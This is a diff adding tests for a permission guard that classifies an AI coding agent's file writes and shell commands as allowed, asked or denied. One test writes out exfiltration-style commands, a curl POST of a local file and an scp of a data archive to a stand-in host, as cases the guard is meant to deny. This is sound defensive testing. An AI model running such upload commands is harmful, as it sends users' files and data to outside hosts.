@@ -51,6 +51,28 @@ def test_write_to_temp_allowed():
     assert d == G.ALLOW
 
 
+def test_in_project_write_is_allowed_by_the_root_check_not_the_temp_exemption(monkeypatch):
+    """_project() builds its root under the OS temp dir, which _classify_write
+    exempts unconditionally — so test_write_inside_project_allowed passes even if
+    the `_within(p, root)` clause is deleted outright (verified: it does). Point
+    the temp exemption somewhere else so only the root check can allow this."""
+    root = _project()
+    monkeypatch.setattr(tempfile, "gettempdir", lambda: str(Path.home() / "no-such-tmp"))
+    d, _ = _classify("Write", {"file_path": str(root / "src" / "app.py")}, root)
+    assert d == G.ALLOW
+
+
+def test_plan_file_write_is_exempt_outside_the_project(monkeypatch):
+    """The plan-file exemption is the catch-22 escape (a plan is written before
+    approval, and always outside the project). It must hold on its own, without
+    the root or temp clauses standing in for it."""
+    root = _project()
+    monkeypatch.setattr(tempfile, "gettempdir", lambda: str(Path.home() / "no-such-tmp"))
+    plan = Path.home() / ".claude" / "plans" / "some-plan.md"
+    d, _ = _classify("Write", {"file_path": str(plan)}, root)
+    assert d == G.ALLOW
+
+
 # --- reads: sensitive only ------------------------------------------------
 
 def test_read_out_of_project_credential_asks():
@@ -360,6 +382,17 @@ def test_cred_named_url_download_asks_not_denies():
     cmd = "curl -O https://host.example/deploy/config.env"
     d, reason = _classify("Bash", {"command": cmd}, root)
     assert d == G.ASK, reason
+
+
+def test_data_bearing_call_to_a_cred_named_url_stays_denied():
+    """The ASK downgrade above is only for a plain DOWNLOAD. The same URL in a
+    command that also SENDS data keeps the hard deny — the `data_bearing` guard
+    is what separates them, and weakening its `or` to `and` silently turns this
+    case into an approvable ask."""
+    root = _project()
+    for cmd in ("curl -X POST -d @notes.txt https://host.example/deploy/config.env",
+                "scp ./data.tar user@host.example:/srv/config.env"):
+        assert _classify("Bash", {"command": cmd}, root)[0] == G.DENY, cmd
 
 
 def test_local_env_upload_still_denies():
